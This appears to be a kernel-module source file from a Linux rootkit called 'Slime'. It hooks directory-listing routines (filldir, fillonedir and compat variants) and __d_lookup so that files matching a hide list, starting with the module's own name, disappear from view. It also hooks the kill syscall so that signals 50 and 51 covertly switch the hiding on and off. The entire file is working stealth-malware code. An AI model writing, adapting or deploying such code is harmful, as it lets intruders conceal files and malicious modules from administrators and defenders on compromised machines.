#include "hide_dir.h"

#ifdef SLIME_DEBUG
static bool hide_dir = false;
static bool hide_sysfs = false;
#else
static bool hide_dir = true;
static bool hide_sysfs = true;
#endif

list_t *hide_list;

bool check_should_hide(const char *file_name)
{
	list_node_t *node;
	list_iterator_t *it = list_iterator_new(hide_list, LIST_HEAD);
	while ((node = list_iterator_next(it))) {
		if (strstr(file_name, (const char *)node->val))
			return true;
	}
	return false;
}

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64,
	  unsigned int);

static int khook_fillonedir(void *__buf, const char *name, int namlen,
			    loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!check_should_hide(name) || !hide_dir)
		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino,
				   d_type);
	return ret;
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);

static int khook_filldir(void *__buf, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!check_should_hide(name) || !hide_dir)
		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino,
				   d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);

static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!check_should_hide(name) || !hide_dir)
		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino,
				   d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64,
	  unsigned int);

static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!check_should_hide(name) || !hide_dir)
		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen,
				   offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64,
	  unsigned int);

static int khook_compat_filldir(void *__buf, const char *name, int namlen,
				loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!check_should_hide(name) || !hide_dir)
		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset,
				   ino, d_type);
	return ret;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64,
	  unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!check_should_hide(name) || !hide_dir)
		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen,
				   offset, ino, d_type);
	return ret;
}
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)

KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *,
	  const struct qstr *);

struct dentry *khook___d_lookup(const struct dentry *parent,
				const struct qstr *name)
#else

KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);

struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
#endif
{
	struct dentry *found = NULL;
	if (!check_should_hide(name->name) || !hide_dir)
		found = KHOOK_ORIGIN(__d_lookup, parent, name);
	return found;
}

KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);

static long khook___x64_sys_kill(const struct pt_regs *regs)
{
#ifdef SLIME_DEBUG
	printk("Slime: Received signal %ld", regs->si);
#endif
	if (regs->si == 50)
		hide_dir = !hide_dir;
	else if (regs->si == 51)
		hide_sysfs = !hide_sysfs;
	else
		return KHOOK_ORIGIN(__x64_sys_kill, regs);
	return 0;
}

int init_hide_dir(void)
{
	char *modName = kmalloc(strlen(MODULE_NAME) + 1, GFP_KERNEL);
	strcpy(modName, MODULE_NAME);
	hide_list = list_new();
	list_rpush(
		hide_list,
		list_node_new(
			modName)); // Add the module name to the hide_dir list
	return 0;
}

int exit_hide_dir(void)
{
	list_destroy(hide_list);
	return 0;
}

SUBMODULE(hide_dir, init_hide_dir, exit_hide_dir);
